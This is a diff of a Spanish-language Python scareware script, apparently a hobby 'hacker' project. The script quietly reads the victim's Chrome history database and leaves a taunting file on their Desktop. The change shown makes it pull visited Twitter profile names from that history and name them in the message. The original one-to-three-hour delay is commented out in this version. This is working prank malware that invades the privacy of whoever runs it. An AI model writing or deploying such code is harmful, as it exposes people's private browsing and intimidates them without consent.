@@ -1,4 +1,5 @@
 import os
+import re
 import sqlite3
 from pathlib import Path
 from time import sleep
@@ -13,7 +14,7 @@ def get_user_path():
 
 
 def create_hacker_file(user_path):
-    hacker_file = open(user_path + "Desktop\\" + HACKERFILE_NAME, "w")
+    hacker_file = open(user_path + "Desktop\\" + HACKER_FILE_NAME, "w")
     hacker_file.write("Hackado papu\n")
     return hacker_file
 
@@ -40,14 +41,18 @@ def get_chrome_history(user_path):
             sleep(3)
 
 
-def check_history_and_scare_user(hacker_file, chrome_history):
-    for item in chrome_history[:10]:
-        hacker_file.write("He visto que has visitado la web de {}, interesante...\n".format(item[0]))
+def check_twitter_profiles(hacker_file, chrome_history):
+    profiles_visited = []
+    for item in chrome_history:
+        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
+        if results and results[0] not in ["notifications", "home"]:
+            profiles_visited.append(results[0])
+    hacker_file.write("He visto que hs estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
 
 
 def main():
     # Esperaremos entre 1 y 3 horas
-    delay_action()
+    # delay_action()
     # Calculamos la ruta de windows
     user_path = get_user_path()
     # Creamos un archivo en el escritorio
@@ -55,7 +60,7 @@ def main():
     # Recogemos su historial de Google, cuando sea posible
     chrome_history = get_chrome_history(user_path)
     # Escribiendo mensajes de miedo
-    check_history_and_scare_user(hacker_file, chrome_history)
+    check_twitter_profiles(hacker_file, chrome_history)
 
 
 if __name__ == "__main__":
